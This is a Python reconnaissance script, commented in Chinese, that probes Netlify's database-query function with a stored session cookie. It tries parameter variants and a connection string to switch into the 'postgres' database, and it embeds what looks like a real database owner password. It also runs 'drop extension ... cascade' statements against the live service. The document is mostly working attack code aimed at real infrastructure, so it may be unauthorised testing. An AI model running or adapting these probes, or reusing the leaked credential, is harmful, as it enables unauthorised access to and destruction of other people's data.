# -*- coding: utf-8 -*-
"""database-query 切库试探 + postgres 库侦察
1. body 加 dbname/databaseName 参数变体 → 能否连 postgres 库
2. 若可切:postgres 库的 definer/对象侦察
3. 清理已装的 h3/citext/hypopg"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A

ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def raw_req(body, timeout=30):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': COOKIE_A}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:800].decode('utf-8', 'ignore')
    conn.close()
    return st, out


def probe(label, extra):
    body = {'siteId': SITE_A, 'action': 'query', 'sql': 'select current_database(), current_user'}
    body.update(extra)
    st, out = raw_req(body)
    print('%-34s [%d] %s' % (label, st, out[:250]))


print('== 切库参数试探 ==')
probe('baseline', {})
probe('dbname=postgres', {'dbname': 'postgres'})
probe('databaseName=postgres', {'databaseName': 'postgres'})
probe('db=postgres', {'db': 'postgres'})
probe('database=postgres', {'database': 'postgres'})
probe('connectionString', {'connectionString': 'postgresql://netlifydb_owner:npg_MtTpnyk2LE4j@127.0.0.1/postgres'})
# 事务 action 变体
body = {'siteId': SITE_A, 'action': 'transaction', 'dbname': 'postgres',
        'queries': [{'sql': 'select current_database()'}]}
st, out = raw_req(body)
print('tx dbname       [%d] %s' % (st, out[:250]))

print()
print('== 清理 h3/citext/hypopg ==')
for ext in ['h3', 'citext', 'hypopg']:
    st, out = raw_req({'siteId': SITE_A, 'action': 'query', 'sql': 'drop extension if exists ' + ext + ' cascade'})
    print('drop %-12s [%d] %s' % (ext, st, out[:200]))
st, out = raw_req({'siteId': SITE_A, 'action': 'query', 'sql': "select extname from pg_extension order by 1"})
print('installed now [%d] %s' % (st, out[:300]))
